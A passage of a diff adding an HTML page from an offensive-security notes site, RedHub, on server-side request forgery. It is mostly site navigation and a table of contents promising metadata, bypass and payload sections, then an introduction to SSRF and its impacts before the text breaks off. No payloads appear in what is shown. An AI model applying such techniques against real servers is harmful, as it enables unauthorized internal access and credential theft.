@@ -1,0 +1,2930 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Web/SSRF/">
+      
+      
+        <link rel="prev" href="../XSS/">
+      
+      
+        <link rel="next" href="../CSRF/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>SSRF (Server-Side Request Forgery) - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#server-side-request-forgery-ssrf" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SSRF (Server-Side Request Forgery)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enterprise Environments
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Enterprise Environments
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful Resources
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basics
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#main-ssrf-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Main SSRF Types
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#where-to-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Where to Test
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#safe-testing-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Safe Testing Workflow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#first-probe-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        First Probe Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-localhost-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Localhost Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#internal-network-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Internal Network Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cloud-metadata-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cloud Metadata SSRF
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Cloud Metadata SSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#aws-ec2-metadata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AWS EC2 Metadata
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#aws-ecs-containers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AWS ECS / Containers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gcp-metadata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GCP Metadata
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#azure-metadata" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Azure Metadata
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloud-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cloud Testing
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypassing-ssrf-defenses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypassing SSRF Defenses
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#denylist-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Denylist Bypasses
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#allowlist-bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Allowlist Bypasses
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#redirect-based-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Redirect-Based Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-rebinding-dns-pinning-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DNS Rebinding / DNS Pinning Issues
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parser-confusion-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Parser Confusion Payloads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#protocol-based-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Protocol-Based SSRF
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Protocol-Based SSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        file://
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dict" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        dict://
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gopher" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        gopher://
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-sftp-tftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ftp://, sftp://, tftp://
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ldap://
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-via-host-header" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF via Host Header
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-via-referer-header" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF via Referer Header
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-via-xml-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF via XML / XXE
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-via-svg-html-markdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF via SVG / HTML / Markdown
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-via-pdf-generators" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF via PDF Generators
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SSRF
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#timing-based-internal-port-checks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Timing-Based Internal Port Checks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-internal-service-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Internal Service Targets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#response-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Response Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-chaining-ideas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSRF Chaining Ideas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#manual-ssrf-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manual SSRF Checklist
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Manual SSRF Checklist">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#external-confirmation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        External Confirmation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in-band-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        In-Band SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-ssrf_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass Testing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloud" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cloud
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-payload-bank" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick Payload Bank
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File_Upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="server-side-request-forgery-ssrf">Server-Side Request Forgery — SSRF</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Server-Side Request Forgery, usually shortened to <strong>SSRF</strong>, is a vulnerability where user-controlled input influences a request made by the server. Instead of the attacker’s browser connecting directly to the target, the vulnerable application becomes the HTTP client.</p>
+<p>The key idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Attacker input  →  vulnerable server-side fetcher  →  internal/external target
+</span></code></pre></div>
+<p>This is dangerous because the server may have network access, firewall permissions, credentials, trust relationships, DNS visibility, or cloud metadata access that the attacker does not have directly.</p>
+<p>SSRF can lead to:</p>
+<ul>
+<li>access to internal-only admin panels</li>
+<li>internal network reconnaissance</li>
+<li>cloud metadata exposure</li>
+<li>theft of temporary cloud credentials</li>
+<li>local file access in some URL-fetching libraries</li>
+<li>interaction with internal services such as Redis, Elasticsearch, Docker API, Jenkins, Consul, Kubernetes APIs, SMTP, Memcached, or databases</li>
+<li>bypassing firewall, VPN, ACL, or reverse-proxy restrictions</li>
+<li>in some cases, remote code execution through chained internal services</li>
+</ul>
+<hr />
+<h2 id="useful-resources">Useful Resources</h2>
+<ul>
